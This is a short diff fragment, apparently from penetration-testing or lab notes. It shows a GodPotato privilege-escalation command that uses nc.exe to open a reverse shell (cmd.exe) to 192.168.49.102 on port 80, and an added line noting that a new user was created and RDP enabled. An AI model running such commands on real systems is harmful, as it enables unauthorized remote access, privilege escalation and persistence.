@@ -52,6 +52,10 @@ https://github.com/int0x33/nc.exe/tree/master
 
 GodPotato-NET4.exe -cmd "nc.exe 192.168.49.102 80 -e cmd.exe"
 
+limited shell therefore added new user and enabled rdp
+
+
+
 
 
 
